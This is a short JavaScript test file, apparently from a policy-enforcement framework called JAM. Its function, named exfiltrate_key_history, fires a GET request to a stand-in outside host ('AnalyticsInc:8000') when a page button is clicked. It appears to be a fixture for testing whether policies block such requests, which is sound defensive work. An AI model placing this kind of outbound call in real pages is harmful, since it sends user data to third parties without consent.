// exfil_test.js
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  JAM.call(JAM.get(xmlhttp, "open", JAM.policy.p1), xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true]);
  xmlhttp.send(null);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
